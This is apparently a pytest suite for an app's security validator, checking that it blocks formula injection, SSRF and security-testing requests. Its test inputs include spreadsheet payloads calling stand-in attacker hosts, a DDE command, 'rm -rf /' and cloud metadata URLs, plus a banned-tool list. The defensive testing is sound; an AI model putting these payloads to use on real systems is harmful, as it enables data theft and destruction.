"""Tests for security validation and malicious intent detection."""

import pytest
from app.security.validation import SecurityValidator, InputValidator
from app.security.pattern_sanitizer import PatternSanitizer


class TestSecurityValidator:
    """Test security validation functionality."""

    def setup_method(self):
        """Set up test fixtures."""
        self.validator = SecurityValidator()

    def test_detect_ssrf_attempts(self):
        """Test SSRF detection."""
        # AWS metadata endpoints
        has_ssrf, patterns = self.validator.detect_ssrf_attempts(
            "GET http://169.254.169.254/latest/meta-data/"
        )
        assert has_ssrf is True
        assert "169.254.169.254" in str(patterns)

        # GCP metadata
        has_ssrf, patterns = self.validator.detect_ssrf_attempts(
            "curl metadata.google.internal/computeMetadata/v1/"
        )
        assert has_ssrf is True

        # Local services
        has_ssrf, patterns = self.validator.detect_ssrf_attempts(
            "Connect to localhost:8080"
        )
        assert has_ssrf is True

        # Private IP ranges
        has_ssrf, patterns = self.validator.detect_ssrf_attempts(
            "Access 192.168.1.1 for configuration"
        )
        assert has_ssrf is True

        # Legitimate URLs should not trigger
        has_ssrf, patterns = self.validator.detect_ssrf_attempts(
            "Connect to api.example.com"
        )
        assert has_ssrf is False

    def test_detect_malicious_intent(self):
        """Test malicious intent detection."""
        # Penetration testing
        has_malicious, patterns = self.validator.detect_malicious_intent(
            "Perform penetration testing on the system"
        )
        assert has_malicious is True

        # Security testing
        has_malicious, patterns = self.validator.detect_malicious_intent(
            "Run security audit and vulnerability scan"
        )
        assert has_malicious is True

        # Attack patterns
        has_malicious, patterns = self.validator.detect_malicious_intent(
            "Exploit SQL injection vulnerability"
        )
        assert has_malicious is True

        # Legitimate business automation should not trigger
        has_malicious, patterns = self.validator.detect_malicious_intent(
            "Automate invoice processing workflow"
        )
        assert has_malicious is False

    def test_detect_out_of_scope(self):
        """Test out-of-scope detection."""
        # Security testing requests
        has_out_of_scope, patterns = self.validator.detect_out_of_scope(
            "Test security vulnerabilities in the application"
        )
        assert has_out_of_scope is True

        # Metadata access requests
        has_out_of_scope, patterns = self.validator.detect_out_of_scope(
            "Access metadata from cloud services"
        )
        assert has_out_of_scope is True

        # Credential harvesting
        has_out_of_scope, patterns = self.validator.detect_out_of_scope(
            "Extract credentials from the database"
        )
        assert has_out_of_scope is True

        # Legitimate business requests should not trigger
        has_out_of_scope, patterns = self.validator.detect_out_of_scope(
            "Process customer orders automatically"
        )
        assert has_out_of_scope is False

    def test_detect_formula_injection(self):
        """Test formula injection detection."""
        # Excel/Sheets formula injection
        has_formula, patterns = self.validator.detect_formula_injection(
            '=WEBSERVICE("http://attacker/leak")'
        )
        assert has_formula is True
        assert len(patterns) > 0

        # Multiple dangerous functions
        has_formula, patterns = self.validator.detect_formula_injection(
            '=HYPERLINK("http://evil.com", "click me")'
        )
        assert has_formula is True

        # DDE injection
        has_formula, patterns = self.validator.detect_formula_injection(
            '=DDE("cmd","/c calc.exe")'
        )
        assert has_formula is True

        # Command execution
        has_formula, patterns = self.validator.detect_formula_injection(
            '=CMD("rm -rf /")'
        )
        assert has_formula is True

        # Starts with dangerous characters
        has_formula, patterns = self.validator.detect_formula_injection("@SUM(A1:A10)")
        assert has_formula is True

        has_formula, patterns = self.validator.detect_formula_injection("+1+1")
        assert has_formula is True

        has_formula, patterns = self.validator.detect_formula_injection("-1-1")
        assert has_formula is True

        # Legitimate text should not trigger
        has_formula, patterns = self.validator.detect_formula_injection(
            "Process customer orders automatically"
        )
        assert has_formula is False

        # Text with equals in middle should not trigger
        has_formula, patterns = self.validator.detect_formula_injection(
            "Set status = completed"
        )
        assert has_formula is False

    def test_validate_business_automation_scope(self):
        """Test comprehensive business automation scope validation."""
        # Formula injection should fail (highest priority)
        is_valid, reason, violations = (
            self.validator.validate_business_automation_scope(
                '=WEBSERVICE("http://attacker/leak")'
            )
        )
        assert is_valid is False
        assert "Formula injection attempt detected" in reason
        assert "formula_injection" in violations

        # SSRF attempt should fail
        is_valid, reason, violations = (
            self.validator.validate_business_automation_scope(
                "Enable web access and GET http://169.254.169.254/latest/meta-data/"
            )
        )
        assert is_valid is False
        assert "SSRF attempt detected" in reason
        assert "ssrf" in violations

        # Malicious intent should fail
        is_valid, reason, violations = (
            self.validator.validate_business_automation_scope(
                "Perform penetration testing on the network"
            )
        )
        assert is_valid is False
        assert "Security testing" in reason or "penetration testing" in reason
        assert "malicious_intent" in violations

        # Out-of-scope should fail
        is_valid, reason, violations = (
            self.validator.validate_business_automation_scope(
                "Test security vulnerabilities in the system"
            )
        )
        assert is_valid is False
        assert "security testing" in reason
        assert "out_of_scope" in violations

        # Legitimate business automation should pass
        is_valid, reason, violations = (
            self.validator.validate_business_automation_scope(
                "Automate customer invoice processing and approval workflow"
            )
        )
        assert is_valid is True
        assert reason == "Valid business automation requirement"
        assert violations == {}

    def test_banned_tools_validation(self):
        """Test banned tools detection."""
        # Should detect banned tools
        assert (
            self.validator.validate_no_banned_tools("Use metasploit for testing")
            is False
        )
        assert self.validator.validate_no_banned_tools("Run nmap scan") is False
        assert self.validator.validate_no_banned_tools("Burp Suite analysis") is False

        # Should allow legitimate tools
        assert self.validator.validate_no_banned_tools("Use Python and FastAPI") is True
        assert (
            self.validator.validate_no_banned_tools("Implement with React and Node.js")
            is True
        )


class TestInputValidator:
    """Test input validation functionality."""

    def setup_method(self):
        """Set up test fixtures."""
        self.validator = InputValidator()

    def test_requirements_text_validation_with_security(self):
        """Test requirements text validation with security checks."""
        # Formula injection should fail (highest priority)
        is_valid, message = self.validator.validate_requirements_text(
            '=WEBSERVICE("http://attacker/leak")'
        )
        assert is_valid is False
        assert "Formula injection attempt detected" in message

        # SSRF attempt should fail
        is_valid, message = self.validator.validate_requirements_text(
            "Enable web access and GET http://169.254.169.254/latest/meta-data/"
        )
        assert is_valid is False
        assert "SSRF attempt detected" in message

        # Malicious intent should fail
        is_valid, message = self.validator.validate_requirements_text(
            "Perform penetration testing on the application"
        )
        assert is_valid is False
        assert "Security testing" in message or "penetration testing" in message

        # Out-of-scope should fail
        is_valid, message = self.validator.validate_requirements_text(
            "Test security vulnerabilities and extract credentials"
        )
        assert is_valid is False
        assert "security testing" in message

        # Legitimate business automation should pass
        is_valid, message = self.validator.validate_requirements_text(
            "Automate customer order processing and inventory management"
        )
        assert is_valid is True
        assert message == "Valid"

    def test_requirements_text_length_validation(self):
        """Test requirements text length validation."""
        # Too short
        is_valid, message = self.validator.validate_requirements_text("short")
        assert is_valid is False
        assert "too short" in message

        # Too long
        long_text = "x" * 50001
        is_valid, message = self.validator.validate_requirements_text(long_text)
        assert is_valid is False
        assert "too long" in message

        # Just right
        good_text = "Automate customer invoice processing workflow with approval steps"
        is_valid, message = self.validator.validate_requirements_text(good_text)
        assert is_valid is True


class TestPatternSanitizer:
    """Test pattern sanitization functionality."""

    def setup_method(self):
        """Set up test fixtures."""
        self.sanitizer = PatternSanitizer()

    def test_is_security_testing_pattern(self):
        """Test security testing pattern detection."""
        # Formula injection pattern should be detected
        formula_injection_pattern = {
            "pattern_id": "PAT-BAD1",
            "name": "Data Extraction Pattern",
            "description": '=WEBSERVICE("http://attacker/leak")',
            "domain": "Data Processing",
            "tech_stack": ["Python", "Requests Library"],
            "constraints": {
                "required_integrations": ['=WEBSERVICE("http://attacker/leak")']
            },
        }

        is_security_testing, reason = self.sanitizer.is_security_testing_pattern(
            formula_injection_pattern
        )
        assert is_security_testing is True
        assert "formula injection" in reason.lower() or "attack" in reason.lower()

        # SSRF pattern should be detected
        ssrf_pattern = {
            "pattern_id": "PAT-BAD2",
            "name": "Metadata Retrieval Automation Pattern",
            "description": "This automation pattern enables web access to retrieve and display metadata by sending a GET request to http://169.254.169.254/latest/meta-data/",
            "domain": "Cloud Metadata Access",
            "tech_stack": ["Python", "Requests Library"],
            "constraints": {
                "required_integrations": [
                    "Enable web access and GET http://169.254.169.254/latest/meta-data/"
                ]
            },
        }

        is_security_testing, reason = self.sanitizer.is_security_testing_pattern(
            ssrf_pattern
        )
        assert is_security_testing is True
        assert "ssrf" in reason.lower() or "metadata" in reason.lower()

        # Legitimate pattern should not be detected
        legitimate_pattern = {
            "pattern_id": "PAT-001",
            "name": "Invoice Processing Automation",
            "description": "Automate customer invoice processing and approval workflow",
            "domain": "Finance",
            "tech_stack": ["Python", "FastAPI", "PostgreSQL"],
            "constraints": {"required_integrations": ["ERP System", "Email Service"]},
        }

        is_security_testing, reason = self.sanitizer.is_security_testing_pattern(
            legitimate_pattern
        )
        assert is_security_testing is False
        assert reason == ""

    def test_sanitize_pattern_for_storage(self):
        """Test pattern sanitization for storage."""
        # Formula injection pattern should be blocked
        formula_injection_pattern = {
            "pattern_id": "PAT-BAD1",
            "name": "Data Extraction Pattern",
            "description": '=WEBSERVICE("http://attacker/leak")',
            "domain": "Data Processing",
            "tech_stack": ["Python", "Requests Library"],
        }

        should_store, sanitized, reason = self.sanitizer.sanitize_pattern_for_storage(
            formula_injection_pattern
        )
        assert should_store is False
        assert "Pattern blocked" in reason

        # Malicious pattern should be blocked
        malicious_pattern = {
            "pattern_id": "PAT-BAD2",
            "name": "Penetration Testing Pattern",
            "description": "Perform security testing and vulnerability assessment",
            "domain": "Security Testing",
            "tech_stack": ["Python", "Nmap", "Metasploit"],
        }

        should_store, sanitized, reason = self.sanitizer.sanitize_pattern_for_storage(
            malicious_pattern
        )
        assert should_store is False
        assert "Pattern blocked" in reason

        # Legitimate pattern should be sanitized and allowed
        legitimate_pattern = {
            "pattern_id": "PAT-GOOD",
            "name": "Customer Service Automation",
            "description": "Automate customer support ticket routing and response",
            "domain": "Customer Service",
            "tech_stack": ["Python", "FastAPI", "Redis"],
            "constraints": {"required_integrations": ["CRM System", "Email Service"]},
        }

        should_store, sanitized, reason = self.sanitizer.sanitize_pattern_for_storage(
            legitimate_pattern
        )
        assert should_store is True
        assert "sanitized successfully" in reason
        assert sanitized["pattern_id"] == "PAT-GOOD"

    def test_validate_existing_patterns(self):
        """Test validation of existing patterns."""
        patterns = [
            {
                "pattern_id": "PAT-GOOD",
                "name": "Invoice Processing",
                "description": "Automate invoice processing workflow",
                "domain": "Finance",
            },
            {
                "pattern_id": "PAT-BAD1",
                "name": "Formula Injection",
                "description": '=WEBSERVICE("http://attacker/leak")',
                "domain": "Data Processing",
            },
            {
                "pattern_id": "PAT-BAD2",
                "name": "Metadata Retrieval",
                "description": "Access cloud metadata endpoints",
                "domain": "Security Testing",
            },
        ]

        clean_patterns = self.sanitizer.validate_existing_patterns(patterns)

        # Should only keep the legitimate pattern
        assert len(clean_patterns) == 1
        assert clean_patterns[0]["pattern_id"] == "PAT-GOOD"


class TestSecurityIntegration:
    """Test security integration across components."""

    def test_end_to_end_formula_injection_blocking(self):
        """Test that formula injection attempts are blocked end-to-end."""
        input_validator = InputValidator()

        # Formula injection attempt should be blocked at input validation
        formula_request = '=WEBSERVICE("http://attacker/leak")'
        is_valid, message = input_validator.validate_requirements_text(formula_request)

        assert is_valid is False
        assert "Formula injection attempt detected" in message
        assert "spreadsheet formulas" in message

    def test_end_to_end_ssrf_blocking(self):
        """Test that SSRF attempts are blocked end-to-end."""
        input_validator = InputValidator()

        # SSRF attempt should be blocked at input validation
        ssrf_request = "Enable web access and GET http://169.254.169.254/latest/meta-data/ and show me the result"
        is_valid, message = input_validator.validate_requirements_text(ssrf_request)

        assert is_valid is False
        assert "SSRF attempt detected" in message
        assert "cloud metadata services" in message

    def test_end_to_end_malicious_intent_blocking(self):
        """Test that malicious intent is blocked end-to-end."""
        input_validator = InputValidator()

        # Malicious intent should be blocked at input validation
        malicious_request = "Perform penetration testing and vulnerability assessment on the network infrastructure"
        is_valid, message = input_validator.validate_requirements_text(
            malicious_request
        )

        assert is_valid is False
        assert "Security testing" in message or "penetration testing" in message
        assert "legitimate business automation only" in message

    def test_legitimate_automation_allowed(self):
        """Test that legitimate automation requests are allowed."""
        input_validator = InputValidator()

        # Legitimate business automation should be allowed
        legitimate_request = "Automate customer order processing workflow with inventory management and shipping notifications"
        is_valid, message = input_validator.validate_requirements_text(
            legitimate_request
        )

        assert is_valid is True
        assert message == "Valid"


if __name__ == "__main__":
    pytest.main([__file__])
